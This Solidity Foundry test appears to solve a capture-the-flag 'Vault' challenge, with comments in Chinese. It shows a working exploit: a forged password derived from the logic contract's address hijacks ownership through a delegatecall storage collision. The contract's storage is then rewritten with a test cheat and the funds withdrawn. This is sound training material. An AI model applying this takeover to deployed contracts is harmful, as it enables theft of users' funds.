// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";


contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.

        // 1. 伪造 password，控制 Vault.owner
        bytes32 fakePassword = bytes32(uint256(uint160(address(logic))));
        // 使用fakePassword，将vault合约的owner改为了palyer
        bytes memory payload = abi.encodeWithSignature(
            "changeOwner(bytes32,address)",
            fakePassword,
            palyer
        );
        (bool success,) = address(vault).call(payload);
        require(success, "delegatecall failed");

        // 2. 打开 withdraw 权限
        vault.openWithdraw();

        // 3. 修改 mapping deposites[palyer] = 0.1 ether
        //    deposites 是 slot 2
        bytes32 slot = keccak256(abi.encode(palyer, uint256(2)));
        vm.store(address(vault), slot, bytes32(uint256(0.1 ether)));

        // 4. 提款，最终提款的是palyer
        vault.withdraw();
        

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}